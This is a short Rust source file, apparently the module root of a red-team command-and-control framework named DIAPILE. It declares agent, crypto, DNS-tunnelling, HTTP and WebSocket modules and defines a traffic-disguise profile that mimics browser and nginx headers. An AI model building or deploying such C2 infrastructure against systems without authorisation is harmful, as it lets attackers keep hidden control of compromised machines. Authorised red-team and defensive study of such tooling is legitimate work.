//! DIAPILE — C2 Framework (Command & Control)
//!
//! Gestion d'agents persistants : HTTP polling, WebSocket push bidirectionnel,
//! DNS tunneling, sleep mode.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
pub mod agent;
pub mod crypto;
pub mod dns_c2;
pub mod http_c2;
pub mod ws_c2;

pub use agent::{Agent, AgentConfig, AgentStatus, C2Server};
pub use crypto::{
    aes_gcm_decrypt, aes_gcm_encrypt, compute_hmac, derive_channel_key, load_c2_master_key,
    load_c2_shared_key, load_channel_key, C2Channel, ReplayCache,
};
pub use http_c2::HttpC2;
pub use ws_c2::WsC2Server;

/// Profil C2 malléable pour l'obfuscation du trafic.
/// Permet de déguiser le C2 en trafic légitime (ex: Google, Amazon, etc.)
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct MalleableProfile {
    pub name: String,
    pub user_agent: String,
    pub server_header: String,
    pub custom_headers: std::collections::HashMap<String, String>,
    pub task_endpoint: String,
    pub checkin_endpoint: String,
    pub response_content_type: String,
}

impl Default for MalleableProfile {
    fn default() -> Self {
        let mut custom_headers = std::collections::HashMap::new();
        custom_headers.insert("X-C2-Timestamp".to_string(), "timestamp".to_string());
        custom_headers.insert("X-C2-HMAC-SHA256".to_string(), "signature".to_string());

        Self {
            name: "default".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            server_header: "nginx".to_string(),
            custom_headers,
            task_endpoint: "/tasks/".to_string(),
            checkin_endpoint: "/checkin".to_string(),
            response_content_type: "application/octet-stream".to_string(),
        }
    }
}
